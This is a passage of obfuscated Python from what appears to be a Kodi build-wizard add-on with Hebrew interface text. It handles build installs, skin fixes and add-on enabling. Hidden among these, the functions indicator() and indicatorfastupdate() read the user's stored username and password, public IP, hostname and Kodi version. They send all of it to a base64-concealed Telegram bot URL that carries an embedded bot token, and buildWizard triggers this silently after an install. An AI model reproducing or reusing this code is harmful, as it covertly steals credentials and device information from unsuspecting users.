        O000OO0OO00O0O000 ={'id':O000O0O000O0OO0OO ,'confirm':OOO00OOOO00OOO000 }#line:3416
        O00OOO0000OO00O00 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3417
        OOOO0OO000O0O0000 =urllib .urlencode (O000OO0OO00O0O000 )#line:3418
        O0O0OO0O0000OOOOO =OOO00OO0OO0O0000O .open (OO00000OO0OOOOO00 +'&'+OOOO0OO000O0O0000 )#line:3419
        chunk_read (O0O0OO0O0000OOOOO ,report_hook =chunk_report ,dp =O0OO0OOO0OOOOO000 ,destination =O00OO00000O0O00OO ,filesize =OO0000OOOOO00OO0O )#line:3420
    return (O0OOOO0OO00000000 )#line:3424
def kodi17Fix ():#line:3425
	O0O0OO0OOO0O00O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3426
	OO00O0OOO0O0OOO0O =[]#line:3427
	for O00OO0OOOO0OOOOO0 in sorted (O0O0OO0OOO0O00O0O ,key =lambda OO0OOOOOOOOOOO00O :OO0OOOOOOOOOOO00O ):#line:3428
		OOOO0000O000O0OOO =os .path .join (O00OO0OOOO0OOOOO0 ,'addon.xml')#line:3429
		if os .path .exists (OOOO0000O000O0OOO ):#line:3430
			O00O000000OO000O0 =O00OO0OOOO0OOOOO0 .replace (ADDONS ,'')[1 :-1 ]#line:3431
			OO0OO0O0O0OO000OO =open (OOOO0000O000O0OOO )#line:3432
			O0O0O0OOOO000000O =OO0OO0O0O0OO000OO .read ()#line:3433
			OO000O00O0O0OOOOO =parseDOM (O0O0O0OOOO000000O ,'addon',ret ='id')#line:3434
			OO0OO0O0O0OO000OO .close ()#line:3435
			try :#line:3436
				O00O00OO00OOO0OO0 =xbmcaddon .Addon (id =OO000O00O0O0OOOOO [0 ])#line:3437
			except :#line:3438
				try :#line:3439
					log ("%s was disabled"%OO000O00O0O0OOOOO [0 ],xbmc .LOGDEBUG )#line:3440
					OO00O0OOO0O0OOO0O .append (OO000O00O0O0OOOOO [0 ])#line:3441
				except :#line:3442
					try :#line:3443
						log ("%s was disabled"%O00O000000OO000O0 ,xbmc .LOGDEBUG )#line:3444
						OO00O0OOO0O0OOO0O .append (O00O000000OO000O0 )#line:3445
					except :#line:3446
						if len (OO000O00O0O0OOOOO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00O000000OO000O0 ,xbmc .LOGERROR )#line:3447
						else :log ("Unabled to enable: %s"%O00OO0OOOO0OOOOO0 ,xbmc .LOGERROR )#line:3448
	if len (OO00O0OOO0O0OOO0O )>0 :#line:3449
		O0OOO0OOOO0000OOO =0 #line:3450
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3451
		for O0000O000O0OO00OO in OO00O0OOO0O0OOO0O :#line:3452
			O0OOO0OOOO0000OOO +=1 #line:3453
			O0OOO00000OO0O000 =int (percentage (O0OOO0OOOO0000OOO ,len (OO00O0OOO0O0OOO0O )))#line:3454
			DP .update (O0OOO00000OO0O000 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O000O0OO00OO ))#line:3455
			addonDatabase (O0000O000O0OO00OO ,1 )#line:3456
			if DP .iscanceled ():break #line:3457
		if DP .iscanceled ():#line:3458
			DP .close ()#line:3459
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3460
			sys .exit ()#line:3461
		DP .close ()#line:3462
	forceUpdate ()#line:3463
def indicator ():#line:3465
       try :#line:3466
          import json #line:3467
          wiz .log ('FRESH MESSAGE')#line:3468
          OO0000OO0OOO0O0OO =(ADDON .getSetting ("user"))#line:3469
          OO000O00OO0O0000O =(ADDON .getSetting ("pass"))#line:3470
          O00OO0OO0O0000O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3471
          OO0OO0O0OO00000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3472
          OOO000000O0000OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3473
          OO0OO0OOOOO00000O =str (json .loads (OOO000000O0000OO0 )['ip'])#line:3474
          OO0OO00O0O00000O0 =OO0000OO0OOO0O0OO #line:3475
          OO0OOO000O0000O00 =OO000O00OO0O0000O #line:3476
          import socket #line:3477
          OOO000000O0000OO0 =urllib2 .urlopen (OO0OO0O0OO00000OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO0OO00O0O00000O0 +' - '+OO0OOO000O0000O00 +' - '+O00OO0OO0O0000O0O +' - '+OO0OO0OOOOO00000O ).readlines ()#line:3478
       except :pass #line:3480
def indicatorfastupdate ():#line:3482
       try :#line:3483
          import json #line:3484
          wiz .log ('FRESH MESSAGE')#line:3485
          O00OOOO00OOOO00O0 =(ADDON .getSetting ("user"))#line:3486
          OO0000OO00000O000 =(ADDON .getSetting ("pass"))#line:3487
          O000O00OO0O00OOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3488
          O0O00O0OO0OO0O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3490
          O0OO00OO0OO0000OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3491
          OOO0000000OO0OO0O =str (json .loads (O0OO00OO0OO0000OO )['ip'])#line:3492
          O00OOO00O000OOOOO =O00OOOO00OOOO00O0 #line:3493
          O00O00OO000000000 =OO0000OO00000O000 #line:3494
          import socket #line:3496
          O0OO00OO0OO0000OO =urllib2 .urlopen (O0O00O0OO0OO0O00O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00OOO00O000OOOOO +' - '+O00O00OO000000000 +' - '+O000O00OO0O00OOO0 +' - '+OOO0000000OO0OO0O ).readlines ()#line:3497
       except :pass #line:3499
def skinfix18 ():#line:3501
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3502
		O0OO00OO00O00OO00 =wiz .workingURL (SKINID18DDONXML )#line:3503
		if O0OO00OO00O00OO00 ==True :#line:3504
			O00O0O000OO0OOO0O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3505
			if len (O00O0O000OO0OOO0O )>0 :#line:3506
				OOOO0OO0OO0O0OOOO ='%s-%s.zip'%(SKINID18 ,O00O0O000OO0OOO0O [0 ])#line:3507
				OOO000O0O000OO0O0 =wiz .workingURL (SKIN18ZIPURL +OOOO0OO0OO0O0OOOO )#line:3508
				if OOO000O0O000OO0O0 ==True :#line:3509
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3510
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3511
					OOOO0OOOO0O0OOO0O =os .path .join (PACKAGES ,OOOO0OO0OO0O0OOOO )#line:3512
					try :os .remove (OOOO0OOOO0O0OOO0O )#line:3513
					except :pass #line:3514
					downloader .download (SKIN18ZIPURL +OOOO0OO0OO0O0OOOO ,OOOO0OOOO0O0OOO0O ,DP )#line:3515
					extract .all (OOOO0OOOO0O0OOO0O ,HOME ,DP )#line:3516
					try :#line:3517
						O0000OO0OO0O0O0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3518
						OO0O0OO00O0000O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3519
						os .rename (O0000OO0OO0O0O0OO ,OO0O0OO00O0000O00 )#line:3520
					except :#line:3521
						pass #line:3522
					try :#line:3523
						OOO000O0OO0OO0O0O =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O0000000O00O0OOO0 =OOO000O0OO0OO0O0O .read ();OOO000O0OO0OO0O0O .close ()#line:3524
						OOOO0OO0OO0O00O0O =wiz .parseDOM (O0000000O00O0OOO0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3525
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OO0OO0O00O0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3526
					except :#line:3527
						pass #line:3528
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3529
					DP .close ()#line:3530
					xbmc .sleep (500 )#line:3531
					wiz .forceUpdate (True )#line:3532
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3533
				else :#line:3534
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3535
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOO000O0O000OO0O0 ,xbmc .LOGERROR )#line:3536
			else :#line:3537
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3538
		else :#line:3539
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3540
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3541
def skinfix17 ():#line:3542
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3543
		O000000O0OOO00OO0 =wiz .workingURL (SKINID17DDONXML )#line:3544
		if O000000O0OOO00OO0 ==True :#line:3545
			OO00OO0O0OO0000O0 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3546
			if len (OO00OO0O0OO0000O0 )>0 :#line:3547
				O0OO0OOOO0000O000 ='%s-%s.zip'%(SKINID17 ,OO00OO0O0OO0000O0 [0 ])#line:3548
				OO0OO00O0OO0O0OO0 =wiz .workingURL (SKIN17ZIPURL +O0OO0OOOO0000O000 )#line:3549
				if OO0OO00O0OO0O0OO0 ==True :#line:3550
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3551
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3552
					OO0000O00000OO0O0 =os .path .join (PACKAGES ,O0OO0OOOO0000O000 )#line:3553
					try :os .remove (OO0000O00000OO0O0 )#line:3554
					except :pass #line:3555
					downloader .download (SKIN17ZIPURL +O0OO0OOOO0000O000 ,OO0000O00000OO0O0 ,DP )#line:3556
					extract .all (OO0000O00000OO0O0 ,HOME ,DP )#line:3557
					try :#line:3558
						O000OOOO00O00O00O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3559
						O0O0OO0OOO00OO000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3560
						os .rename (O000OOOO00O00O00O ,O0O0OO0OOO00OO000 )#line:3561
					except :#line:3562
						pass #line:3563
					try :#line:3564
						OOO0OO0O000O0OO0O =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O000O0O00OO0OOO0O =OOO0OO0O000O0OO0O .read ();OOO0OO0O000O0OO0O .close ()#line:3565
						O00OO00OO0OO00000 =wiz .parseDOM (O000O0O00OO0OOO0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3566
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00OO0OO00000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3567
					except :#line:3568
						pass #line:3569
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3570
					DP .close ()#line:3571
					xbmc .sleep (500 )#line:3572
					wiz .forceUpdate (True )#line:3573
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3574
				else :#line:3575
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3576
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0OO00O0OO0O0OO0 ,xbmc .LOGERROR )#line:3577
			else :#line:3578
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3579
		else :#line:3580
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3581
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3582
def fix17update ():#line:3583
	if KODIV >=17 and KODIV <18 :#line:3584
		wiz .kodi17Fix ()#line:3585
		xbmc .sleep (4000 )#line:3586
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3587
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3588
		fixfont ()#line:3589
		O0O00O0O00000O0O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3590
		try :#line:3592
			O0O00OOO0OO0000O0 =open (O0O00O0O00000O0O0 ,'r')#line:3593
			O0OOO0O000O0OO000 =O0O00OOO0OO0000O0 .read ()#line:3594
			O0O00OOO0OO0000O0 .close ()#line:3595
			O0OOO0O0O0O00OO00 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3596
			O00O0O0OOOO0OOO00 =re .compile (O0OOO0O0O0O00OO00 ).findall (O0OOO0O000O0OO000 )[0 ]#line:3597
			O0O00OOO0OO0000O0 =open (O0O00O0O00000O0O0 ,'w')#line:3598
			O0O00OOO0OO0000O0 .write (O0OOO0O000O0OO000 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00O0O0OOOO0OOO00 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3599
			O0O00OOO0OO0000O0 .close ()#line:3600
		except :#line:3601
				pass #line:3602
		wiz .kodi17Fix ()#line:3603
		O0O00O0O00000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3604
		try :#line:3605
			O0O00OOO0OO0000O0 =open (O0O00O0O00000O0O0 ,'r')#line:3606
			O0OOO0O000O0OO000 =O0O00OOO0OO0000O0 .read ()#line:3607
			O0O00OOO0OO0000O0 .close ()#line:3608
			O0OOO0O0O0O00OO00 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3609
			O00O0O0OOOO0OOO00 =re .compile (O0OOO0O0O0O00OO00 ).findall (O0OOO0O000O0OO000 )[0 ]#line:3610
			O0O00OOO0OO0000O0 =open (O0O00O0O00000O0O0 ,'w')#line:3611
			O0O00OOO0OO0000O0 .write (O0OOO0O000O0OO000 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00O0O0OOOO0OOO00 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3612
			O0O00OOO0OO0000O0 .close ()#line:3613
		except :#line:3614
				pass #line:3615
		swapSkins ('skin.Premium.mod')#line:3616
def fix18update ():#line:3618
	if KODIV >=18 :#line:3619
		xbmc .sleep (4000 )#line:3620
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3621
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3622
		fixfont ()#line:3623
		O0OOOOO0OOOO0O0O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3624
		try :#line:3625
			OO0OOOO0OO000O0O0 =open (O0OOOOO0OOOO0O0O0 ,'r')#line:3626
			O0OO0OO00O0OO0OOO =OO0OOOO0OO000O0O0 .read ()#line:3627
			OO0OOOO0OO000O0O0 .close ()#line:3628
			O00O00O0OOOOOOOO0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3629
			OO00O00000OOO0O0O =re .compile (O00O00O0OOOOOOOO0 ).findall (O0OO0OO00O0OO0OOO )[0 ]#line:3630
			OO0OOOO0OO000O0O0 =open (O0OOOOO0OOOO0O0O0 ,'w')#line:3631
			OO0OOOO0OO000O0O0 .write (O0OO0OO00O0OO0OOO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO00O00000OOO0O0O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3632
			OO0OOOO0OO000O0O0 .close ()#line:3633
		except :#line:3634
				pass #line:3635
		wiz .kodi17Fix ()#line:3636
		O0OOOOO0OOOO0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3637
		try :#line:3638
			OO0OOOO0OO000O0O0 =open (O0OOOOO0OOOO0O0O0 ,'r')#line:3639
			O0OO0OO00O0OO0OOO =OO0OOOO0OO000O0O0 .read ()#line:3640
			OO0OOOO0OO000O0O0 .close ()#line:3641
			O00O00O0OOOOOOOO0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3642
			OO00O00000OOO0O0O =re .compile (O00O00O0OOOOOOOO0 ).findall (O0OO0OO00O0OO0OOO )[0 ]#line:3643
			OO0OOOO0OO000O0O0 =open (O0OOOOO0OOOO0O0O0 ,'w')#line:3644
			OO0OOOO0OO000O0O0 .write (O0OO0OO00O0OO0OOO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO00O00000OOO0O0O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3645
			OO0OOOO0OO000O0O0 .close ()#line:3646
		except :#line:3647
				pass #line:3648
		swapSkins ('skin.Premium.mod')#line:3649
def buildWizard (OO0O0O0O000O0OOOO ,O00OO00000000O0O0 ,theme =None ,over =False ):#line:3652
	if over ==False :#line:3653
		O0O000000OO00OOOO =wiz .checkBuild (OO0O0O0O000O0OOOO ,'url')#line:3654
		if O0O000000OO00OOOO ==False :#line:3656
			xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','אנא המתן')))#line:3660
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3661
			return #line:3662
		OO000O00000OOO00O =wiz .workingURL (O0O000000OO00OOOO )#line:3663
		if OO000O00000OOO00O ==False :#line:3664
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO000O00000OOO00O ))#line:3665
			return #line:3666
	if O00OO00000000O0O0 =='gui':#line:3667
		if OO0O0O0O000O0OOOO ==BUILDNAME :#line:3668
			if over ==True :OO0O0OO000OO0OO00 =1 #line:3669
			else :OO0O0OO000OO0OO00 =1 #line:3670
		else :#line:3671
			OO0O0OO000OO0OO00 =1 #line:3672
		if OO0O0OO000OO0OO00 :#line:3673
			remove_addons ()#line:3674
			remove_addons2 ()#line:3675
			O00O00OOOO00O0O0O =wiz .checkBuild (OO0O0O0O000O0OOOO ,'gui')#line:3676
			O0OO0O0O00OOO000O =OO0O0O0O000O0OOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3677
			if not wiz .workingURL (O00O00OOOO00O0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3678
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3679
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0O000O0OOOO ),'','אנא המתן')#line:3680
			OO000OO00O000OOO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO0O0O00OOO000O )#line:3681
			try :os .remove (OO000OO00O000OOO0 )#line:3682
			except :pass #line:3683
			logging .warning (O00O00OOOO00O0O0O )#line:3684
			if 'google'in O00O00OOOO00O0O0O :#line:3685
			   OOOOOOO0O0000OOOO =googledrive_download (O00O00OOOO00O0O0O ,OO000OO00O000OOO0 ,DP ,wiz .checkBuild (OO0O0O0O000O0OOOO ,'filesize'))#line:3686
			else :#line:3689
			  downloader .download (O00O00OOOO00O0O0O ,OO000OO00O000OOO0 ,DP )#line:3690
			xbmc .sleep (100 )#line:3691
			O00O0O0O000O00000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0O000O0OOOO )#line:3692
			DP .update (0 ,O00O0O0O000O00000 ,'','אנא המתן')#line:3693
			extract .all (OO000OO00O000OOO0 ,HOME ,DP ,title =O00O0O0O000O00000 )#line:3694
			DP .close ()#line:3695
			wiz .defaultSkin ()#line:3696
			wiz .lookandFeelData ('save')#line:3697
			wiz .kodi17Fix ()#line:3698
			if KODIV >=18 :#line:3699
				skindialogsettind18 ()#line:3700
			xbmc .executebuiltin ("ReloadSkin()")#line:3701
			if INSTALLMETHOD ==1 :OOO0OO0OOOOO00O0O =1 #line:3702
			elif INSTALLMETHOD ==2 :OOO0OO0OOOOO00O0O =0 #line:3703
			else :DP .close ()#line:3704
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3705
			indicatorfastupdate ()#line:3706
		else :#line:3708
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3709
	if O00OO00000000O0O0 =='gui2':#line:3710
		if OO0O0O0O000O0OOOO ==BUILDNAME :#line:3711
			if over ==True :OO0O0OO000OO0OO00 =1 #line:3712
			else :OO0O0OO000OO0OO00 =1 #line:3713
		else :#line:3714
			OO0O0OO000OO0OO00 =1 #line:3715
		if OO0O0OO000OO0OO00 :#line:3716
			remove_addons ()#line:3717
			remove_addons2 ()#line:3718
			O00O00OOOO00O0O0O =wiz .checkBuild (OO0O0O0O000O0OOOO ,'gui')#line:3719
			O0OO0O0O00OOO000O =OO0O0O0O000O0OOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3720
			if not wiz .workingURL (O00O00OOOO00O0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3721
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3722
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0O000O0OOOO ),'','אנא המתן')#line:3723
			OO000OO00O000OOO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO0O0O00OOO000O )#line:3724
			try :os .remove (OO000OO00O000OOO0 )#line:3725
			except :pass #line:3726
			logging .warning (O00O00OOOO00O0O0O )#line:3727
			if 'google'in O00O00OOOO00O0O0O :#line:3728
			   OOOOOOO0O0000OOOO =googledrive_download (O00O00OOOO00O0O0O ,OO000OO00O000OOO0 ,DP ,wiz .checkBuild (OO0O0O0O000O0OOOO ,'filesize'))#line:3729
			else :#line:3732
			  downloader .download (O00O00OOOO00O0O0O ,OO000OO00O000OOO0 ,DP )#line:3733
			xbmc .sleep (100 )#line:3734
			O00O0O0O000O00000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0O000O0OOOO )#line:3735
			DP .update (0 ,O00O0O0O000O00000 ,'','אנא המתן')#line:3736
			extract .all (OO000OO00O000OOO0 ,HOME ,DP ,title =O00O0O0O000O00000 )#line:3737
			DP .close ()#line:3738
			wiz .defaultSkin ()#line:3739
			wiz .lookandFeelData ('save')#line:3740
			if INSTALLMETHOD ==1 :OOO0OO0OOOOO00O0O =1 #line:3743
			elif INSTALLMETHOD ==2 :OOO0OO0OOOOO00O0O =0 #line:3744
			else :DP .close ()#line:3745
		else :#line:3747
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3748
	elif O00OO00000000O0O0 =='fresh':#line:3749
		freshStart (OO0O0O0O000O0OOOO )#line:3750
	elif O00OO00000000O0O0 =='normal':#line:3751
		if url =='normal':#line:3752
			if KEEPTRAKT =='true':#line:3753
				traktit .autoUpdate ('all')#line:3754
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3755
			if KEEPREAL =='true':#line:3756
				debridit .autoUpdate ('all')#line:3757
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3758
			if KEEPLOGIN =='true':#line:3759
				loginit .autoUpdate ('all')#line:3760
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3761
		O00O000O0OO00OOO0 =int (KODIV );OOOO00OO000OO000O =int (float (wiz .checkBuild (OO0O0O0O000O0OOOO ,'kodi')))#line:3762
		if not O00O000O0OO00OOO0 ==OOOO00OO000OO000O :#line:3763
			if O00O000O0OO00OOO0 ==16 and OOOO00OO000OO000O <=15 :O0OO0O0000OO00O00 =False #line:3764
			else :O0OO0O0000OO00O00 =True #line:3765
		else :O0OO0O0000OO00O00 =False #line:3766
		if O0OO0O0000OO00O00 ==True :#line:3767
			OO0O00OO0OOO0O0OO =1 #line:3768
		else :#line:3769
			if not over ==False :OO0O00OO0OOO0O0OO =1 #line:3770
			else :OO0O00OO0OOO0O0OO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3771
		if OO0O00OO0OOO0O0OO :#line:3772
			wiz .clearS ('build')#line:3773
			O00O00OOOO00O0O0O =wiz .checkBuild (OO0O0O0O000O0OOOO ,'url')#line:3774
			O0OO0O0O00OOO000O =OO0O0O0O000O0OOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3775
			if not wiz .workingURL (O00O00OOOO00O0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3776
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3777
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0O000O0OOOO ,wiz .checkBuild (OO0O0O0O000O0OOOO ,'version')),'','אנא המתן')#line:3778
			OO000OO00O000OOO0 =os .path .join (PACKAGES ,'%s.zip'%O0OO0O0O00OOO000O )#line:3779
			try :os .remove (OO000OO00O000OOO0 )#line:3780
			except :pass #line:3781
			logging .warning (O00O00OOOO00O0O0O )#line:3782
			if 'google'in O00O00OOOO00O0O0O :#line:3783
			   OOOOOOO0O0000OOOO =googledrive_download (O00O00OOOO00O0O0O ,OO000OO00O000OOO0 ,DP ,wiz .checkBuild (OO0O0O0O000O0OOOO ,'filesize'))#line:3784
			else :#line:3787
			  downloader .download (O00O00OOOO00O0O0O ,OO000OO00O000OOO0 ,DP )#line:3788
			xbmc .sleep (1000 )#line:3789
			O00O0O0O000O00000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0O000O0OOOO ,wiz .checkBuild (OO0O0O0O000O0OOOO ,'version'))#line:3790
			DP .update (0 ,O00O0O0O000O00000 ,'','Please Wait')#line:3791
			OOOOO0O0000O0OO00 ,OO00OO0O00OOO00OO ,O0OOO0O00O000O00O =extract .all (OO000OO00O000OOO0 ,HOME ,DP ,title =O00O0O0O000O00000 )#line:3792
			if int (float (OOOOO0O0000O0OO00 ))>0 :#line:3793
				wiz .fixmetas ()#line:3794
				wiz .lookandFeelData ('save')#line:3795
				wiz .defaultSkin ()#line:3796
				wiz .setS ('buildname',OO0O0O0O000O0OOOO )#line:3798
				wiz .setS ('buildversion',wiz .checkBuild (OO0O0O0O000O0OOOO ,'version'))#line:3799
				wiz .setS ('buildtheme','')#line:3800
				wiz .setS ('latestversion',wiz .checkBuild (OO0O0O0O000O0OOOO ,'version'))#line:3801
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3802
